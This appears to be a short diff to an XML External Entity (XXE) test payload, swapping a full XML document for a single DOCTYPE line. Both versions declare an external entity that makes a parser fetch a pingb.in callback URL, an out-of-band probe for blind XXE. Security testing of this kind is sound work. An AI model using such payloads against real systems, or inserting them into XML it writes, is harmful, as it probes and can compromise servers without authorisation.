@@ -1,4 +1,1 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-    <!DOCTYPE foo [<!ELEMENT foo ANY>
-    <!ENTITY xxe SYSTEM "http://pingb.in/p/d0c2e08cbcd7598a4ab8d0e21efb">]>
-    <foo>&xxe;</foo>
+<!DOCTYPE testXXE [ <!ENTITY xxe SYSTEM "http://pingb.in/p/d0c2e08cbcd7598a4ab8d0e21efb"> ]>
